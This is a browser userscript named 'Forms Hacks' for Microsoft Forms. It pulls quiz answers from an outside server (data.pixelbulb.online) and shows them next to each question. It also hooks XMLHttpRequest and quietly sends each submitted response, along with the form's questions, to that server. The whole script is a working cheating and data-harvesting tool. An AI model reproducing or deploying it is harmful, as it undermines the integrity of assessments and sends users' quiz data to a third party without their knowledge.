// ==UserScript==
// @name         Forms Hacks
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Microsoft Forms hacks script that supports Microsoft Teams.
// @author       You
// @match        https://forms.office.com/Pages/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=forms.microsoft.com
// @grant        none
// @downloadURL  https://raw.githubusercontent.com/UtterDonkey/bh-gui/main/forms.user.js
// @updateURL    https://raw.githubusercontent.com/UtterDonkey/bh-gui/main/forms.user.js
// ==/UserScript==

(function() {
    'use strict';

    (async () => {
        await new Promise(resolve => {
            const interval = setInterval(() => {
                if (document.querySelector('div[data-automation-id=noticeContainer]')) {
                    clearInterval(interval);
                    resolve();
                };
            });
        });
        let formData = {};

        function hackClient() {
            if (window.trueRequest) return;
            window.trueRequest = XMLHttpRequest;
            const tri = [];
            const open = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function (method, url, ...rest) {
                if (url.includes('/responses')) {
                    (async () => {
                        await new Promise(resolve => {
                            const interval = setInterval(() => {
                                if (this.responseText) {
                                    clearInterval(interval);
                                    resolve();
                                }
                            }, 100);
                        });
                        await (await fetch("https://data.pixelbulb.online/forms?url=" + encodeURIComponent(location.href) + '&submit=' + encodeURIComponent(JSON.stringify({ response: this.responseText, form: formData })))).json();
                    })();
                }
                return open.call(this, method, url, ...rest);
            };


        }

        const notice = document.createElement('span');
        notice.innerText = 'Loading Answers...';
        document.querySelector('div[data-automation-id=noticeContainer]').appendChild(notice);
        const form = (await (await fetch('https://data.pixelbulb.online/forms?url=' + encodeURIComponent(location.href))).json());
        if (form.quizResult === null || form.error) {
            const thisForm = (await (await fetch(`https://forms.office.com/handlers/ResponsePageStartup.ashx?id=${(new URL(location.href)).searchParams.get('id')}&mobile=false`)).json()).data.form;
            formData = thisForm.questions;
            const res = await (await fetch("https://data.pixelbulb.online/forms?questions=" + encodeURIComponent(JSON.stringify(formData.map(e => { return { id: e.id, question: e.title } }))))).json();
            Object.entries(res).forEach(result => {
                const span = document.createElement('span');
                span.innerHTML = '<hr>Possible answer: <b>' + result[1] + `${'<'}/b>`;
                document.querySelector('span#QuestionInfo_' + result[0]).insertAdjacentElement('afterend', span);
            });

            notice.innerText = Object.keys(res).length > 0 ? 'This form doesn\'t fully support answers yet. Found answers are Displayed in Bold.' : (JSON.parse(thisForm.settings).IsQuizMode ? 'This form doesn\'t support answers yet.' : 'This form isn\'t a quiz.');
            hackClient();
        } else {

            const results = JSON.parse(form.quizResult);
            notice.innerText = 'Loading Form Data...';
            const questions = (await (await fetch(`https://forms.office.com/handlers/ResponsePageStartup.ashx?id=${(new URL(location.href)).searchParams.get('id')}&mobile=false`)).json()).data.form.questions;
            questions.forEach(q => {
                const question = JSON.parse(q.questionInfo);
                const result = results.find(e => e.id == q.id);
                if (!result) return;
                if (!(question.Choices || result.gradingBasis)) return;


                const basis = JSON.parse(result.gradingBasis || '[{}]')[0];
                const correctAnswer = result.gradingBasis ? basis.answers ? basis.answers.join(', ') : basis.answer : question.Choices.map(e => e.Description).filter((e, i) => result.answerKeys[i]).join(', ');
                const span = document.createElement('span');
                span.innerHTML = '<hr><b>' + correctAnswer + `${'<'}/b>`;
                document.querySelector('span#QuestionInfo_' + result.id).insertAdjacentElement('afterend', span);
            });
            notice.innerText = 'Answers are Displayed in Bold.';
            hackClient();
        }
    })();
})();
